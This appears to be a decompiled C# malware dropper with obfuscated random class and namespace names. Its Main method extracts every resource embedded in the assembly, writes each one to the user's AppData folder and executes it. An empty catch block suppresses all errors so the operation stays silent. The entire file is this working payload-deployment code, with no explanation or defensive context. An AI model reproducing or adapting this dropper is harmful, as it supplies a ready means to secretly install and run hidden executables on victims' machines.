using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace HVrrSCrshvdmblkf1THtAGI9evhKDdvciPW16FxQE6lv;

internal class V7dJEF4gazbnrnwvQYdaadw
{
	private static void Main()
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
			string[] array = manifestResourceNames;
			foreach (string text in array)
			{
				Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(text);
				if (manifestResourceStream != null)
				{
					BinaryReader binaryReader = new BinaryReader(manifestResourceStream);
					FileStream output = new FileStream(folderPath + "\\" + text, FileMode.Create);
					BinaryWriter binaryWriter = new BinaryWriter(output);
					byte[] array2 = new byte[manifestResourceStream.Length];
					manifestResourceStream.Read(array2, 0, array2.Length);
					binaryWriter.Write(array2);
					binaryReader.Close();
					binaryWriter.Close();
					manifestResourceStream.Close();
					Process.Start(folderPath + "\\" + text);
				}
			}
		}
		catch
		{
		}
	}
}
